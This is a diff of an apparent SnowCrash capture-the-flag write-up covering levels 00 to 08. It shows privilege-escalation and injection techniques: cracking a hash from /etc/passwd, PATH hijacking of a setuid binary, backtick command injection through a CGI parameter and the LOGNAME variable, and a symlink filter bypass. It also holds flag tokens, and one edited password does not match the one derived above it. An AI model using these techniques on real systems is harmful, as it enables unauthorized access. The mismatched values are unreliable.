@@ -27,7 +27,6 @@ check /etc/passwd, flag01 has a visible password string
 
 flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
 
-I downloaded huntkit instead of kali or parrot to have a lightweight machine with all the pentest tools like john the ripper. 
 so next getting the passwd file to the vm and running a password cracker.
 
 	scp -P 4242 level00@[SnowCrashIp]:/etc/passwd .
@@ -54,10 +53,10 @@ Following a package stream I find
 Password: ft_wandr...NDRel.L0L
 
 I open up hexdump and notice each point is 7f which is del in ascii. 
-I keep looking a little more, try utf-8 and I find the password is: `ft_wandrNDRelL0L`
+I keep looking a little more, try utf-8 and I find the password is: `ft_wandrNDRelL0L` where 7F is (del)
 
 	su flag02
-	ft_wandrNDRelL0L
+	ft_waNDReL0L 
 	getflag
 
 > Check flag.Here is your token : `kooda2puivaav1idi4f57q8iq`
@@ -92,8 +91,7 @@ Making my own echo file
 
 and adding to PATH before the original echo
 
-	cp echo /tmp
-	export PATH=/tmp:$PATH
+	export PATH=.:$PATH
 	./level03
 
 > Check flag.Here is your token : `qi0maab88jeaj46qoumi7maus`
@@ -109,7 +107,7 @@ use CGI qw{param}; // CGI is Common Gateway Interface, a webserver for script ex
 Inside I see it can take a parameter 'x'
 so I can run:
 
-	curl localhost:4747?x=`getflag`
+	curl 'localhost:4747?x=`getflag`'
 
 > Check flag.Here is your token : `ne2searoevaevoem4ov4ar8ap`
 
@@ -247,18 +245,8 @@ So now I check the env variable LOGNAME has the username "level07" and that the 
 
 	level07@SnowCrash:~$ echo $LOGNAME
 	level07
-	level07@SnowCrash:~$ export LOGNAME="dada;ls -ls"
+	level07@SnowCrash:~$ export LOGNAME="`getflag`"
 	level07@SnowCrash:~$ ./level07
-	dada
-	ls: cannot open directory .: Permission denied
-	level07@SnowCrash:~$ chmod 777 .
-	level07@SnowCrash:~$ ./level07
-	dada
-	total 12
-	12 -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
-	level07@SnowCrash:~$ export LOGNAME="dada;getflag"
-	level07@SnowCrash:~$ ./level07
-	dada
 	Check flag.Here is your token : `fiumuikeil55xe9cu4dood66h`
 
 ## level08
@@ -297,10 +285,10 @@ It's output is what I expected from running the exec not much else. I then try l
 So it's checking if the argument contains the string "token" and if it does it prints "You may not access 'token'".
 Since I don't have rights to `token` I can't copy or modify so I make a symbolic link
 
-	level08@SnowCrash:~$ ln -s token t0ken
+	level08@SnowCrash:~$ ln -s token tok
 	level08@SnowCrash:~$ ls
-	level08  t0ken  token
-	level08@SnowCrash:~$ ./level08 t0ken
+	level08  tok  token
+	level08@SnowCrash:~$ ./level08 tok
 	quif5eloekouj29ke0vouxean
 	level08@SnowCrash:~$ su flag08
 	Password:
